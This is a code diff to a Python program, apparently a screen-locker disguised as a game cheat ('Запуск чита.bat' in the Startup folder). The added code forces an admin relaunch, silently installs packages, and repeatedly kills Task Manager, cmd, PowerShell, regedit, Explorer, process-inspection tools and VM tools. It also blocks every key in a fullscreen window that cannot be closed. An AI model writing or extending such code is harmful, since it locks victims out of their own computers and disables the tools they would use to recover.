@@ -10,8 +10,20 @@ import pygame
 from PIL import Image, ImageTk
 import stat
 
+
 class a:
     def __init__(self):
+        import sys
+        import os
+        import ctypes
+        if os.name == 'nt':
+            try:
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            except:
+                is_admin = False
+            if not is_admin:
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, '"' + os.path.abspath(__file__) + '"', None, 1)
+                os._exit(0)
         self.b = tk.Tk()
         self.c()
         self.d()
@@ -25,28 +37,44 @@ class a:
     def protect_self(self):
         import subprocess
         import shutil
+        import sys
+        import os
+        import time
+        try:
+            import wmi
+        except ImportError:
+            subprocess.call([sys.executable, '-m', 'pip', 'install', 'wmi'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            import wmi
         try:
             import psutil
         except ImportError:
-            import sys
-            subprocess.call([sys.executable, '-m', 'pip', 'install', 'psutil'])
+            subprocess.call([sys.executable, '-m', 'pip', 'install', 'psutil'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             import psutil
         script_dir = os.path.dirname(os.path.abspath(__file__))
         bat_name = 'Запуск чита.bat'
         bat_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', bat_name)
         pyw_path = os.path.abspath(__file__)
+        c = wmi.WMI()
+        block_names = [
+            'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe', 'conhost.exe',
+            'ProcessHacker.exe', 'procexp.exe', 'procexp64.exe', 'explorer.exe',
+            'rdpclip.exe', 'mstsc.exe', 'vds.exe', 'VirtualDesktopAccessor.exe',
+            'VBoxTray.exe', 'vmtoolsd.exe'
+        ]
         while True:
             try:
-                # Закрытие taskmgr через psutil
-                for proc in psutil.process_iter(['name']):
+                for process in c.Win32_Process():
                     try:
-                        if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
-                            proc.terminate()
+                        pname = process.Name.lower() if process.Name else ''
+                        if pname in block_names or 'desktop' in pname or 'vds' in pname or 'virtual' in pname or 'vbox' in pname or 'vmtool' in pname:
+                            os.kill(int(process.ProcessId), 9)
                     except Exception:
                         pass
-                tasks = subprocess.check_output('tasklist', creationflags=0x08000000).decode(errors='ignore')
-                for line in tasks.splitlines():
-                    if ('python.exe' in line.lower() or 'pythonw.exe' in line.lower()) and str(os.getpid()) not in line:
+                for proc in psutil.process_iter(['name', 'pid']):
+                    try:
+                        if (proc.info['name'] and ('python.exe' in proc.info['name'].lower() or 'pythonw.exe' in proc.info['name'].lower())) and proc.info['pid'] != os.getpid():
+                            pass
+                    except Exception:
                         pass
                 if not os.path.exists(pyw_path):
                     if os.path.exists(bat_path):
@@ -69,6 +97,15 @@ class a:
         self.b.attributes('-fullscreen', True)
         self.b.attributes('-topmost', True)
         self.b.protocol("WM_DELETE_WINDOW", lambda: None)
+        for key in [
+            'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
+            'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
+            'F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
+            'Tab','Caps_Lock','Shift_L','Shift_R','Control_L','Control_R','Alt_L','Alt_R','Super_L','Super_R',
+            'Insert','Delete','Home','End','Prior','Next','Page_Up','Page_Down','Up','Down','Left','Right',
+            'Escape','Return','BackSpace','space','minus','equal','bracketleft','bracketright','backslash','semicolon','apostrophe','comma','period','slash','grave',
+            'Num_Lock','Scroll_Lock','Pause','Print','Menu','KP_0','KP_1','KP_2','KP_3','KP_4','KP_5','KP_6','KP_7','KP_8','KP_9','KP_Decimal','KP_Divide','KP_Multiply','KP_Subtract','KP_Add','KP_Enter','KP_Separator']:
+            self.b.bind(f'<KeyPress-{key}>', lambda e: "break")
         self.b.bind('<Alt-F4>', lambda e: None)
         self.b.bind('<Control-Alt-Delete>', lambda e: None)
         self.b.bind('<Alt-Tab>', lambda e: None)
